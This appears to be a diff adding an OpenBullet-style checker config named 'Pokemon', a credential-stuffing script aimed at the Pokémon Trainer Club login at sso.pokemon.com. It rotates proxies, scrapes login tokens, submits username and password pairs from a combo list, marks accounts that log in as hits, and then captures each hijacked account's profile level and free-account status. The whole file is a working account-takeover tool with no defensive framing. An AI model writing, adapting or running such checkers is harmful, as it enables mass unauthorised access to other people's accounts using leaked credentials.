@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "Pokemon",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-30T02:56:25.7571311+00:00",
+  "AdditionalInfo": "",
+  "Author": "Train",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://sso.pokemon.com/sso/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "name=\"lt\" value=\"" "\"" Recursive=FALSE -> VAR "LT" "" "" 
+PARSE "<SOURCE>" LR "execution\" value=\"" "\"" Recursive=FALSE -> VAR "exec" "" "" 
+REQUEST POST "https://sso.pokemon.com/sso/login" AutoRedirect=TRUE 
+  CONTENT "lt=<LT>&execution=<exec>&_eventId=submit&username=<USER>&password=<PASS>&Login=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Log In Successful" 
+  KEYCHAIN Failure OR 
+    KEY "Your username or password is incorrect" 
+REQUEST GET "https://www.pokemon.com/us/pokemon-trainer-club/my-profile/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "data-level=\"" "\"" Recursive=FALSE -> CAP "Level" "" "" 
+REQUEST GET "https://www.pokemon.com/us/pokemon-tcg/play-online/leaderboards/overall/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Sign in to your account" 
